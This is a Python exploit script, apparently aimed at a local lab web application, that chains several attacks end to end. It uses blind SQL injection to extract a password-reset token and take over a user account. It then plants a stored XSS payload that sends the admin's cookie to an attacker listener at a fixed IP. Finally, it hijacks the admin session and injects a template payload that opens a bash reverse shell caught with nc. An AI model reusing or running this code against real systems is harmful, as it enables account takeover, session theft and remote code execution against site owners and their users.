import requests
import socket
import subprocess
import time
import sys
import threading
import urllib.parse

# URL
URL_FORGOT_PASSWORD = "http://localhost:9999/forgotpassword.php"
URL_FORGOT_USERNAME = "http://localhost:9999/forgotusername.php"
URL_RESET_PASSWORD = "http://localhost:9999/resetpassword.php"
URL_LOGIN = "http://localhost:9999/login.php"
URL_PROFILE = "http://localhost:9999/profile.php"
URL_MOTD_UPDATE = "http://localhost:9999/admin/update_motd.php"
URL_INDEX = "http://localhost:9999/index.php"

# For Listener
host = "192.168.33.138"
lport = 9095
rce_port = 5555

# Burp proxy
PROXY = {
    "http": "127.0.0.1:8080"
}

# Charset
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

# Headers
HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}

# Session
session = requests.Session()
session.proxies.update(PROXY)
session.headers.update(HEADERS)

def post_request(url, raw_data):
    try:
        response = session.post(url, data=raw_data)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request Failed: {e}")
        return None

def GenerateToken():
    print("[*] Generating Token...")
    data = "username=user1"
    response = post_request(URL_FORGOT_PASSWORD, data)
    if response:
        print(f"[+] Response Code: {response.status_code}")
    else:
        print("[!] No Response.")

def ExtractToken():
    print("[*] Extracting token with SQL injection...")
    token = ""
    for position in range(1, 33):
        for char in CHARSET:
            payload = f"user1' AND (SELECT substr(token,{position},1)='{char}' FROM tokens LIMIT 1)--;"
            raw_data = f"username={payload}"
            response = post_request(URL_FORGOT_USERNAME, raw_data)

            if response and "User exists!" in response.text:
                token += char
                print(f"\r[+] Token: {token}", end="", flush=True)
                break
        else:
            token += "?"
        if position == 1 and token == "?":
            sys.exit(1)
            
    print()
    return token

def ResetPassword(token):
    print("[*] Resetting password...")
    new_pass = "testing1"
    raw_data = f"token={token}&password1={new_pass}&password2={new_pass}"
    response = post_request(URL_RESET_PASSWORD, raw_data)
    
    if response:
        print(f"[+] Reset password response: {response.status_code}")
    else:
        print("[!] Reset password failed.")

def Login():
    print("[*] Logging in as user1...")
    username = "user1"
    data = f"username={username}&password=testing1"
    response = post_request(URL_LOGIN, data)
    
    if response:
        print(f"[+] Login response: {response.status_code}")
    else:
        print("[!] Login failed.")

def StealCookie():
    print("[*] Changing description and starting listener...")
    xss_payload = f'<script>document.write(\'<img src="http://{host}:{lport}/?cookie=\'.concat(document.cookie, \'" />\'))</script>'
    raw_data = f"description={xss_payload}"
    response = session.post(URL_PROFILE, data=raw_data)
    print(f"[+] Payload sent. Status Code: {response.status_code}")
    print("[*] Waiting for admin to click...\n")

    s = None
    client_socket = None
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", lport))
        s.listen(1)

        client_socket, client_addr = s.accept()
        data = client_socket.recv(1024)
        request_line = data.decode(errors="ignore").split("\r\n")[0]
        cookie = request_line.split("GET /?cookie=")[-1].split(" ")[0]

        print("[+] Admin Cookie:")
        print(" ----   " + cookie)
        return cookie

    except Exception as e:
        print(f"[!] Listener Error: {e}")
        return None

    finally:
        if client_socket:
            try:
                client_socket.close()
            except Exception:
                pass
        if s:
            try:
                s.close()
            except Exception:
                pass

def ChangeCookie(cookie):
    print("[*] Changing cookie and logging in as admin...")
    session.cookies.clear()
    key, value = cookie.split("=")
    session.cookies.set(key, value)
    print(f"[+] Added admin cookie: {key}={value}")

def AdminToRCE():
    ssti_payload = '{php}exec("/bin/bash -c \'bash -i >& /dev/tcp/%s/%d 0>&1\'");{/php}' % (host, rce_port)
    raw_payload = {"message": ssti_payload}
    print("[*] Sending SSTI payload...")
    r = session.post(URL_MOTD_UPDATE, data=raw_payload)

    if r and r.status_code == 200:
        print("[+] MoTD updated successfully.")
    else:
        print("[!] MoTD update failed!")

    print("[*] Starting listener...")
    listener_process = subprocess.Popen(["nc", "-nvlp", str(rce_port)])

    time.sleep(2)
    print("[*] Triggering SSTI Payload (Homepage GET)...")
    session.get(URL_INDEX)

    listener_process.wait()
 

if __name__ == "__main__":
    try:
        GenerateToken()
        token = ExtractToken()
        print(f"\n[+] Extracted Token: {token}")
        ResetPassword(token)
        Login()
        cookie = StealCookie()
        if not cookie:
            print("[!] Couldn't get admin cookie")
            sys.exit(1)
        ChangeCookie(cookie)
        AdminToRCE()
        
    except KeyboardInterrupt:
        print("\n[!] Process killed by user.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
